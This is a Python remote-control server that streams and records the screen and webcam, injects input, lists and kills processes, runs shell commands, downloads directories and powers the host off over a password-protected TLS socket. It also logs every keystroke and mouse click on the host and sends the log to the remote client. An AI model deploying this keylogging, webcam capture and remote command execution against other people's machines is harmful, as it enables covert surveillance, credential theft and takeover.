import socket
import ssl
import cv2
import mss
import numpy as np
import pyautogui
import struct
import threading
import random
import psutil
import logging
import string
import json
import subprocess
import time
import re
import zipfile
import sys
import os
from pathlib import Path
from pynput import keyboard, mouse

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# PART 1: COMMAND INTERFACE & REGISTRY
# ==========================================

class BaseCommand:
    """Interface for all server commands."""
    def execute(self, server, conn, data):
        raise NotImplementedError

class CommandRegistry:
    """Registry to map command types to their respective classes."""
    _commands = {}

    @classmethod
    def register(cls, cmd_type):
        def decorator(command_class):
            cls._commands[cmd_type] = command_class()
            return command_class
        return decorator

    @classmethod
    def get(cls, cmd_type):
        return cls._commands.get(cmd_type)

# ==========================================
# PART 2: SPECIFIC COMMAND IMPLEMENTATIONS
# ==========================================

@CommandRegistry.register("MOUSE")
class MouseCommand(BaseCommand):
    def execute(self, server, conn, data):
        pyautogui.click(data['x'], data['y'], button=data.get('btn', 'left'))

@CommandRegistry.register("KEY")
class KeyCommand(BaseCommand):
    def execute(self, server, conn, data):
        pyautogui.press(data['key'])

@CommandRegistry.register("STREAM_CTRL")
class StreamCtrlCommand(BaseCommand):
    def execute(self, server, conn, data):
        server.is_streaming = data['active']
        server.stream_mode = data.get('mode', "SCREEN")

@CommandRegistry.register("LIST_PROCS")
class ListProcsCommand(BaseCommand):
    def execute(self, server, conn, data):
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'cmdline']):
            try:
                info = p.info
                # Prefer cmdline (full path/args) for better clarity
                name = " ".join(info['cmdline']) if info['cmdline'] else info['name']
                if len(name) > 120: name = name[:117] + "..."
                procs.append({
                    "pid": info['pid'],
                    "name": name,
                    "cpu_percent": info['cpu_percent'],
                    "memory_percent": info['memory_percent']
                })
            except: continue
        server.send_json(conn, procs)

@CommandRegistry.register("KILL_PROC")
class KillProcCommand(BaseCommand):
    def execute(self, server, conn, data):
        try:
            psutil.Process(data['pid']).terminate()
        except: pass

@CommandRegistry.register("LIST_APPS")
class ListAppsCommand(BaseCommand):
    def execute(self, server, conn, data):
        apps = []
        if sys.platform == "linux":
            search_paths = [Path("/usr/share/applications"), Path("/var/lib/snapd/desktop/applications"), Path.home()/".local/share/applications"]
            for p in search_paths:
                if p.exists():
                    for f in p.glob("*.desktop"):
                        try:
                            with open(f, 'r', errors='ignore') as df:
                                content = df.read()
                                name = re.search(r'^Name=(.*)', content, re.M)
                                exec_c = re.search(r'^Exec=(.*)', content, re.M)
                                if name and exec_c:
                                    apps.append({"name": name.group(1).strip(), "exec": re.sub(r'%[a-zA-Z]', '', exec_c.group(1)).strip(), "type": "Application"})
                        except: continue
        elif sys.platform == "win32":
            # Basic Windows App listing (Start Menu)
            search_paths = [Path(os.environ["ProgramData"]) / "Microsoft/Windows/Start Menu/Programs", Path(os.environ["AppData"]) / "Microsoft/Windows/Start Menu/Programs"]
            for p in search_paths:
                if p.exists():
                    for f in p.rglob("*.lnk"):
                        apps.append({"name": f.stem, "exec": str(f), "type": "Shortcut"})
        
        apps.sort(key=lambda x: x['name'].lower())
        server.send_json(conn, apps)

@CommandRegistry.register("START_APP")
class StartAppCommand(BaseCommand):
    def execute(self, server, conn, data):
        try:
            if sys.platform == "win32": os.startfile(data['exec'])
            else: subprocess.Popen(data['exec'], shell=True, start_new_session=True)
        except Exception as e:
            logging.error(f"Start App Error: {e}")

@CommandRegistry.register("LIST_FILES")
class ListFilesCommand(BaseCommand):
    def execute(self, server, conn, data):
        p = Path(data['path'])
        files = []
        if p.exists() and p.is_dir():
            for item in p.iterdir():
                try: files.append({"name": item.name, "is_dir": item.is_dir(), "size": item.stat().st_size if not item.is_dir() else 0})
                except: continue
        server.send_json(conn, files)

@CommandRegistry.register("DOWNLOAD")
class DownloadCommand(BaseCommand):
    def execute(self, server, conn, data):
        p = Path(data['path'])
        temp_zip = None
        if p.is_dir():
            temp_zip = Path("temp_dl.zip")
            with zipfile.ZipFile(temp_zip, 'w') as z:
                for f in p.rglob('*'):
                    try: z.write(f, f.relative_to(p))
                    except: continue
            p = temp_zip
        
        if p.is_file():
            sz = p.stat().st_size
            conn.sendall(struct.pack("!Q", sz))
            with open(p, "rb") as f:
                while chunk := f.read(32768): conn.sendall(chunk)
        else:
            conn.sendall(struct.pack("!Q", 0))
        
        if temp_zip and temp_zip.exists():
            try: temp_zip.unlink()
            except: pass

@CommandRegistry.register("SCREENSHOT")
class ScreenshotCommand(BaseCommand):
    def execute(self, server, conn, data):
        try:
            if data.get('mode') == "WEBCAM":
                cap = cv2.VideoCapture(0)
                ret, img = cap.read()
                cap.release()
                if not ret: 
                    conn.sendall(struct.pack("!I", 0))
                    return
            else:
                with mss.mss() as sct:
                    img = np.array(sct.grab(sct.monitors[1]))
                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            
            _, enc = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 85])
            raw = enc.tobytes()
            conn.sendall(struct.pack("!I", len(raw)) + raw)
        except Exception as e:
            logging.error(f"Screenshot Error: {e}")
            conn.sendall(struct.pack("!I", 0))

@CommandRegistry.register("REC_START")
class RecStartCommand(BaseCommand):
    def execute(self, server, conn, data):
        if not server.is_recording:
            server.is_recording = True
            threading.Thread(target=server._record_worker, daemon=True).start()

@CommandRegistry.register("REC_STOP")
class RecStopCommand(BaseCommand):
    def execute(self, server, conn, data):
        server.is_recording = False
        # Wait for worker to finish
        for _ in range(20):
            if server.recorder is None: break
            time.sleep(0.1)
        
        p = Path("temp_rec.mp4")
        if p.exists():
            sz = p.stat().st_size
            logging.info(f"Sending video file: {sz} bytes")
            conn.sendall(struct.pack("!Q", sz))
            with open(p, "rb") as f:
                while chunk := f.read(65536):
                    try: conn.sendall(chunk)
                    except: break
            try: p.unlink()
            except: pass
        else:
            conn.sendall(struct.pack("!Q", 0))

@CommandRegistry.register("GET_LOGS")
class GetLogsCommand(BaseCommand):
    def execute(self, server, conn, data):
        logs = "\n".join(server.activity_logs)
        server.activity_logs.clear() # Clear after sending
        p = logs.encode('utf-8')
        conn.sendall(struct.pack("!I", len(p)) + p)

@CommandRegistry.register("SHUTDOWN")
class ShutdownCommand(BaseCommand):
    def execute(self, server, conn, data):
        logging.info("Server shutting down...")
        conn.sendall(b"OK")
        time.sleep(2)
        if sys.platform == "win32": os.system("shutdown /s /t 1")
        else: os.system("systemctl poweroff")

@CommandRegistry.register("RESTART")
class RestartCommand(BaseCommand):
    def execute(self, server, conn, data):
        logging.info("Server restarting...")
        conn.sendall(b"OK")
        time.sleep(2)
        if sys.platform == "win32": os.system("shutdown /r /t 1")
        else: os.system("systemctl reboot")

# ==========================================
# PART 3: MAIN SERVER CORE
# ==========================================

class ControlServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port_stream = 9998
        self.port_cmd = 9999
        self.password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.running = True
        self.is_streaming = False
        self.stream_mode = "SCREEN"
        self.is_recording = False
        self.recorder = None
        self.activity_logs = []
        
        # Setup Listeners
        self.start_listeners()
        self.ssl_context = self.setup_ssl()
        
        try:
            w, h = pyautogui.size()
            self.native_res = (w, h) if w > 0 else (1280, 720)
        except: self.native_res = (1280, 720)

        print(f"\n{'='*50}\nCONTROL SERVER - ONLINE\nIP: {self.get_local_ip()}\nPASS: {self.password}\n{'='*50}\n")

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try: s.connect(('8.8.8.8', 1)); ip = s.getsockname()[0]
        except: ip = '127.0.0.1'
        finally: s.close()
        return ip

    def setup_ssl(self):
        cp, kp = Path("server.crt"), Path("server.key")
        if not (cp.exists() and kp.exists()): self.generate_certs(cp, kp)
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(certfile=cp, keyfile=kp)
        return ctx

    def generate_certs(self, cp, kp):
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        key = rsa.generate_private_key(65537, 2048)
        sub = iss = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, u"localhost")])
        cert = x509.CertificateBuilder().subject_name(sub).issuer_name(iss).public_key(key.public_key()).serial_number(x509.random_serial_number()).not_valid_before(datetime.datetime.utcnow()).not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365)).sign(key, hashes.SHA256())
        with open(kp, "wb") as f: f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        with open(cp, "wb") as f: f.write(cert.public_bytes(serialization.Encoding.PEM))

    def start_listeners(self):
        def op(k):
            try: 
                char = k.char if hasattr(k, 'char') else str(k)
                self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Key: {char}")
            except: pass
        def oc(x, y, b, p):
            if p: self.activity_logs.append(f"[{time.strftime('%H:%M:%S')}] Mouse {b} at ({x}, {y})")
        
        self.kl = keyboard.Listener(on_press=op); self.kl.start()
        self.ml = mouse.Listener(on_click=oc); self.ml.start()

    def stop(self):
        self.running = False
        self.kl.stop(); self.ml.stop()
        if self.recorder: self.recorder.release()

    def stream_loop(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); raw.settimeout(1.0)
        raw.bind((self.host, self.port_stream)); raw.listen(10)
        while self.running:
            try:
                c, _ = raw.accept()
                sc = self.ssl_context.wrap_socket(c, server_side=True)
                threading.Thread(target=self.handle_stream, args=(sc,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e: logging.error(f"Stream Error: {e}")

    def _record_worker(self):
        logging.info("Recording worker started.")
        cam = cv2.VideoCapture(0)
        with mss.mss() as sct:
            try:
                while self.running and self.is_recording:
                    if self.stream_mode == "SCREEN":
                        img = np.array(sct.grab(sct.monitors[1]))
                        f = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    else:
                        ret, f = cam.read()
                        if not ret: f = np.zeros((480, 640, 3), np.uint8)
                    
                    if self.recorder is None:
                        h, w = f.shape[:2]
                        self.recorder = cv2.VideoWriter("temp_rec.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 10, (w, h))
                    
                    self.recorder.write(f)
                    time.sleep(0.08) # Target ~12 FPS
            except Exception as e:
                logging.error(f"Record Worker Error: {e}")
            finally:
                if self.recorder:
                    self.recorder.release()
                    self.recorder = None
                cam.release()
                logging.info("Recording worker stopped and file finalized.")

    def handle_stream(self, conn):
        cam = cv2.VideoCapture(0)
        with mss.mss() as sct:
            try:
                while self.running:
                    if self.stream_mode == "SCREEN":
                        img = np.array(sct.grab(sct.monitors[1]))
                        f = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    else:
                        ret, f = cam.read()
                        if not ret: f = np.zeros((480, 640, 3), np.uint8)
                    
                    if not self.is_streaming: 
                        time.sleep(0.5)
                        continue
                        
                    _, enc = cv2.imencode('.jpg', f, [cv2.IMWRITE_JPEG_QUALITY, 45])
                    b = enc.tobytes()
                    conn.sendall(struct.pack("!I", len(b)) + b)
            except: pass
            finally: 
                conn.close()
                cam.release()

    def command_loop(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); raw.settimeout(1.0)
        raw.bind((self.host, self.port_cmd)); raw.listen(10)
        while self.running:
            try:
                c, _ = raw.accept()
                sc = self.ssl_context.wrap_socket(c, server_side=True)
                threading.Thread(target=self.handle_command, args=(sc,), daemon=True).start()
            except socket.timeout: continue
            except Exception as e: logging.error(f"Command Error: {e}")

    def handle_command(self, conn):
        try:
            pwd = conn.recv(1024).decode()
            if pwd != self.password:
                res = json.dumps({"status": "FAIL", "msg": "Invalid Password"}).encode()
                conn.sendall(struct.pack("!I", len(res)) + res)
                conn.close()
                return
            
            res = json.dumps({"status": "OK", "w": self.native_res[0], "h": self.native_res[1]}).encode()
            conn.sendall(struct.pack("!I", len(res)) + res)
            
            while self.running:
                h = conn.recv(4)
                if not h: break
                sz = struct.unpack("!I", h)[0]
                req = b""
                while len(req) < sz:
                    ch = conn.recv(min(sz-len(req), 8192))
                    if not ch: break
                    req += ch
                if not req: break
                data = json.loads(req.decode())
                
                # --- COMMAND PATTERN EXECUTION ---
                command = CommandRegistry.get(data['type'])
                if command:
                    command.execute(self, conn, data)
                else:
                    logging.warning(f"Unknown Command: {data['type']}")
        except: pass
        finally: conn.close()

    def send_json(self, conn, data):
        p = json.dumps(data).encode('utf-8')
        conn.sendall(struct.pack("!I", len(p)) + p)

if __name__ == "__main__":
    server = ControlServer()
    threading.Thread(target=server.stream_loop, daemon=True).start()
    threading.Thread(target=server.command_loop, daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        server.stop()
        sys.exit(0)
